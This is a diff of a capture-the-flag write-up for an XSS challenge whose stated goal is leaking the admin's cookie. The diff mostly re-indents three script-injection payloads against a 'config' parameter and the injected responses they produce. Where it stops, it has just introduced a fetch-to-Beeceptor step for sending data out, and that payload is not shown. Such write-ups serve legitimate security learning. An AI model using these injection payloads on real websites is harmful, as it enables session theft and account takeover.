@@ -17,66 +17,70 @@ The website can change the theme of layout. The main goal is to leak admin's coo
 ## Exploit - XSS
 1. Use burp suit to check if the website has XSS vulnerability.
     ![](https://i.imgur.com/eu4Qqrs.png)
+
 2. Try to modify `config` parameter
     * Payload 1: `1;alert(123);console.log({x://\`
     * Response 1
-    ```javascript
-    ...
-    <script>
-        url.value = location; config.value = '1;
-        alert(123);
-        console.log({x://\'; fetch('/1;alert(123);console.log({x://\.json').then(r => r.json()).then(json => {
-            particlesJS("particles-js", json)
-        })
-    </script>
-    ...
-    ```
+        ```javascript
+        ...
+        <script>
+            url.value = location; config.value = '1;
+            alert(123);
+            console.log({x://\'; fetch('/1;alert(123);console.log({x://\.json').then(r => r.json()).then(json => {
+                particlesJS("particles-js", json)
+            })
+        </script>
+        ...
+        ```
+
     or
     * Payload 2: `</script><script>alert(123);</script>`
     * Response 2
-    ```javascript
-    ...
-    <script>
-    url.value = location; config.value = '
-    </script>
-    <script>
-        alert(123);
-    </script>
-    '; fetch('/</script>
-    <script>
-        alert(123);
-    </script>
-    .json').then(r => r.json()).then(json => {
-            particlesJS("particles-js", json)
-        })
-    </script>
-    ...
-    ```
-    or 
+        ```javascript
+        ...
+        <script>
+        url.value = location; config.value = '
+        </script>
+        <script>
+            alert(123);
+        </script>
+        '; fetch('/</script>
+        <script>
+            alert(123);
+        </script>
+        .json').then(r => r.json()).then(json => {
+                particlesJS("particles-js", json)
+            })
+        </script>
+        ...
+        ```
+
+    or
     * Payload 3: `</script><script>alert(123);</script><script>console.log({x://`
     * Response 3
-    ```javascript
-    ...
-    <script>
-    url.value = location; config.value = '
-    </script>
-    <script>
-        alert(123);
-    </script>
-    <script>
-        console.log({x://'; fetch('/
-    </script>
-    <script>   
-        alert(123);
-    </script>
-    <script>
-        console.log({x://.json').then(r => r.json()).then(json => {
-            particlesJS("particles-js", json)
-        })
-    </script>
-    ...
-    ```
+        ```javascript
+        ...
+        <script>
+        url.value = location; config.value = '
+        </script>
+        <script>
+            alert(123);
+        </script>
+        <script>
+            console.log({x://'; fetch('/
+        </script>
+        <script>   
+            alert(123);
+        </script>
+        <script>
+            console.log({x://.json').then(r => r.json()).then(json => {
+                particlesJS("particles-js", json)
+            })
+        </script>
+        ...
+        ```
     ![](https://i.imgur.com/yDcnYv8.png)
+
 3. `fetch` + [`Beeceptor`](https://beeceptor.com/)
     * Payload: 
     ```javascript
